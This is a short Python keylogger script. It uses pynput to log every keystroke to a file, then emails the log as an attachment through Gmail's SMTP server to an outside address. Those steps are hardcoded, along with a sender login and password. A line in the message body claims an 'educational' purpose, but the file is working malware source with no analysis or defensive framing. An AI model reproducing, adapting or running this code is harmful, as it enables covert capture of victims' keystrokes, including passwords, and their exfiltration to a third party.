import pynput
from pynput.keyboard import Key, Listener
import logging
import os
from email.utils import formataddr
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication


log_dir = r"C:/users/farrellfawzi/Log"
logging.basicConfig(filename = (log_dir + r"/keyLogger.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()


smtp_server = 'smtp.gmail.com'
smtp_port = 587
email_username = 'nyancatindomie@gmail.com'
email_password = 'Neymarisdaddy'

sender_email = 'nyancatindomie@gmail.com'
receiver_email = 'farrellfawzi7@gmail.com'
subject = ':)'
body = 'This is for educational purposes.'

msg = MIMEMultipart()
msg["From"] = formataddr(("Obamna.", f"{sender_email}"))
msg['To'] = receiver_email
msg['Subject'] = subject
msg.attach(MIMEText(body))

with open('keyLogger.txt', 'rb') as f:
    attachment = MIMEApplication(f.read(), _subtype='txt')
    attachment.add_header('Content-Disposition', 'attachment', filename='keyLogger.txt')
    msg.attach(attachment)

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
    smtp.starttls()
    smtp.login(email_username, email_password)
    smtp.send_message(msg)
